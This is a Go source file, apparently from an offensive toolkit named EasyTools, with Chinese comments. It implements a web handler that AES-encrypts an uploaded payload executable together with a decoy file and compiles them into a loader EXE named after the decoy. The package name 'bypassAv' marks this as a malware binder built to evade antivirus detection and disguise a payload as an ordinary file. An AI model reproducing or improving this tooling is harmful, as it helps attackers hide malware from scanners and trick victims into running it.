package bypassAv

import (
	"EasyTools/app/bypass/shell/binder/encode"
	"EasyTools/app/bypass/shell/binder/util"
	util1 "EasyTools/app/bypass/shell/util"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/labstack/gommon/log"
)

// sendError 为了便于统一返回错误消息
func sendError(c *gin.Context, status int, errMsg string) {
	c.JSON(status, gin.H{
		"success": false,
		"error":   errMsg,
	})
}

// RunBinder 处理文件上传和后续处理
func RunBinder(c *gin.Context) {
	// 检查授权
	err := util1.InitGoModule()
	if err != nil {
		// 与 /initCheck 保持一致：error 必须是字符串，前端统一读该字段展示真实原因。
		// 历史实现写的是 "message": err（error 接口序列化成 {}），既没有 error 字段、
		// 内容也丢了，前端只能显示 axios 兜底的 "Request failed with status code 400"。
		msg := fmt.Sprintf("环境初始化失败: %v", err)
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   msg,
			"message": msg,
		})
		return
	}

	// 获取临时目录中的工作目录
	workDir := filepath.Join(os.TempDir(), "EasyTools", "file")

	// 保存当前目录
	originalDir, err := os.Getwd()
	if err != nil {
		fmt.Printf("获取当前目录失败: %s\n", err)
		return
	}

	// 切换到临时目录中的工作目录
	if err := os.Chdir(workDir); err != nil {
		fmt.Printf("切换工作目录失败: %s\n", err)
		return
	}

	// 确保函数结束时切换回原目录
	defer func() {
		os.Chdir(originalDir)
	}()

	// 1. 获取上传文件，字段名需与前端el-upload组件里的配置一致
	payloadFile, err := c.FormFile("payload_exe")
	if err != nil {
		sendError(c, http.StatusBadRequest, fmt.Sprintf("获取 Payload 文件失败: %v", err))
		return
	}
	binderFile, err := c.FormFile("binder_file")
	if err != nil {
		sendError(c, http.StatusBadRequest, fmt.Sprintf("获取捆绑文件失败: %v", err))
		return
	}

	// 如果需要，可以在此处增加文件大小检查（例如：100MB以内）
	const maxSize = 100 << 20 // 100MB
	if payloadFile.Size > maxSize {
		sendError(c, http.StatusBadRequest, "Payload 文件大小超过限制（100MB）")
		return
	}
	if binderFile.Size > maxSize {
		sendError(c, http.StatusBadRequest, "捆绑文件大小超过限制（100MB）")
		return
	}

	// 3. 保存临时文件（文件名取 Base 防路径穿越）
	payloadName := filepath.Base(payloadFile.Filename)
	binderName := filepath.Base(binderFile.Filename)
	if payloadName == "" || binderName == "" || strings.ContainsAny(payloadName, `/\`) || strings.ContainsAny(binderName, `/\`) {
		sendError(c, http.StatusBadRequest, "非法的文件名")
		return
	}
	payloadPath := filepath.Join(workDir, payloadName)
	if err := c.SaveUploadedFile(payloadFile, payloadPath); err != nil {
		sendError(c, http.StatusBadRequest, fmt.Sprintf("保存 Payload 文件失败: %v", err))
		return
	}

	binderPath := filepath.Join(workDir, binderName)
	if err := c.SaveUploadedFile(binderFile, binderPath); err != nil {
		_ = os.Remove(payloadPath)
		sendError(c, http.StatusBadRequest, fmt.Sprintf("保存捆绑文件失败: %v", err))
		return
	}

	// 4. 验证文件类型：
	//    - Payload 文件必须为 .exe 格式
	//    - 捆绑文件不能为 .exe 格式
	if strings.ToLower(filepath.Ext(payloadPath)) != ".exe" {
		cleanTempFiles(payloadPath, binderPath)
		sendError(c, http.StatusBadRequest, "Payload 文件必须为 EXE 格式")
		return
	}
	if strings.ToLower(filepath.Ext(binderPath)) == ".exe" {
		cleanTempFiles(payloadPath, binderPath)
		sendError(c, http.StatusBadRequest, "捆绑文件不能为 EXE 格式")
		return
	}

	// 5. 读取上传文件内容
	payloadData, err := os.ReadFile(payloadPath)
	if err != nil {
		cleanTempFiles(payloadPath, binderPath)
		sendError(c, http.StatusInternalServerError, fmt.Sprintf("读取 Payload 文件失败: %v", err))
		return
	}
	binderData, err := os.ReadFile(binderPath)
	if err != nil {
		cleanTempFiles(payloadPath, binderPath)
		sendError(c, http.StatusInternalServerError, fmt.Sprintf("读取捆绑文件失败: %v", err))
		return
	}

	// 6. 生成随机密钥（32位字符串，可根据需求修改长度）
	randomKey, err := util.GenerateRandomString(32)
	if err != nil {
		cleanTempFiles(payloadPath, binderPath)
		sendError(c, http.StatusInternalServerError, fmt.Sprintf("生成密钥失败: %v", err))
		return
	}

	// 7. 使用 AES 对文件内容进行加密
	encryptedPayload, err := encode.AesEncrypt(payloadData, []byte(randomKey))
	if err != nil {
		cleanTempFiles(payloadPath, binderPath)
		sendError(c, http.StatusInternalServerError, fmt.Sprintf("Payload 文件 AES 加密失败: %v", err))
		return
	}

	encryptedBinder, err := encode.AesEncrypt(binderData, []byte(randomKey))
	if err != nil {
		cleanTempFiles(payloadPath, binderPath)
		sendError(c, http.StatusInternalServerError, fmt.Sprintf("捆绑文件 AES 加密失败: %v", err))
		return
	}

	// 8. 输出目录配置（生成的 go 模板、可执行文件存放目录）
	resultDir := filepath.Join(originalDir, "EasyToolsFiles", "file")
	if err := os.MkdirAll(resultDir, 0755); err != nil {
		cleanTempFiles(payloadPath, binderPath)
		sendError(c, http.StatusInternalServerError, fmt.Sprintf("创建输出目录失败: %v", err))
		return
	}

	// 9. 根据需要生成 Go 模板文件
	argSlice := []string{
		"demo1",
		binderName,               // 原始文件名
		randomKey,                // 加密密钥
		string(encryptedPayload), // 加密后的 payload 文件内容
		string(encryptedBinder),  // 加密后的捆绑文件内容
		workDir,                  // 将输出目录改为临时工作目录，确保 Go 文件生成在正确位置
	}

	goFileName := util.GenGoFile(argSlice)

	// 10. 根据生成的 Go 文件编译生成最终可执行文件（输出名取 Base 防穿越）
	exeName := strings.TrimSuffix(binderName, filepath.Ext(binderName)) + ".exe"
	exeName = filepath.Base(exeName)
	exeFilePath := filepath.Join(resultDir, exeName) // 最终输出到 resultDir

	if err := util.BuildLoaderFile(goFileName, exeFilePath); err != nil {
		cleanTempFiles(payloadPath, binderPath, goFileName)
		sendError(c, http.StatusInternalServerError, fmt.Sprintf("编译生成可执行文件失败: %v", err))
		return
	}

	// 11. 清理临时文件
	cleanTempFiles(payloadPath, binderPath, goFileName)

	log.Info(fmt.Sprintf("成功生成捆绑文件: %s", exeFilePath))
	c.JSON(http.StatusOK, gin.H{
		"success":  true,
		"exe_path": exeFilePath,
		"message":  "文件处理成功",
	})
}

// cleanTempFiles 辅助函数，用于删除多个文件（只删本次请求产生的文件，不删除共享目录）
func cleanTempFiles(files ...string) {
	for _, f := range files {
		if _, err := os.Stat(f); err == nil {
			_ = os.Remove(f)
		}
	}
}
